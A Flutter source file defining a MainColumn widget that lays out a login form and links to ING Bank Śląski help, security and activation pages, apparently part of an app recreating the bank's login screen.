
import 'package:flutter/material.dart';
import 'package:slaski/presentation/homepage/sub_container.dart';

import '../../layout/homepage/desktab.dart';
import '../../layout/layout.dart';

class MainColumn extends StatefulWidget {
  const MainColumn(
      BuildContext context,
      double width,
      GlobalKey<FormState> formKey,
      TextEditingController loginController,
      Uri urk,
      Uri url,
      Uri keyi,
      Uri lock,
      {super.key});

  @override
  State<MainColumn> createState() => _MainColumnState();
}

class _MainColumnState extends State<MainColumn> {
  final Uri lock = Uri.parse(
      'https://www.ing.pl/indywidualni/bankowosc-internetowa/bezpieczenstwo');
  final Uri keyi =
      Uri.parse('https://www.ing.pl/indywidualni/odnosniki/aktywacja');
  final Uri urk = Uri.parse(
      'https://www.ing.pl/indywidualni/bankowosc-internetowa/centrum-pomocy');
  final Uri url = Uri.parse(
      'https://www.ing.pl/aktualnosci/bankowosc-elektroniczna?news_id=1105917-oszusci-wysylaja-mejle-podszywajace-sie-pod-bank?src=login');
  final GlobalKey<FormState> formKey = GlobalKey<FormState>();
  final TextEditingController loginController = TextEditingController();
  @override
  Widget build(BuildContext context) {
    final width = MediaQuery.of(context).size.width;

    return ListView(children: [
      Center(
        child: SizedBox(
          width: Layout.isDesktop(context) ? width / 2.3 : width / 1.8,
          child: Padding(
              padding: const EdgeInsets.all(2.0),
              child: SubContainer(
                  formKey: formKey,
                  loginController: loginController,
                  urk: urk,
                  url: url)),
        ),
      ),
      const SizedBox(
        height: 45,
      ),
      IsDeskTabContainerWidget(keyi: keyi, lock: lock),
         const SizedBox(height: 40,)
    ]);
  }
}

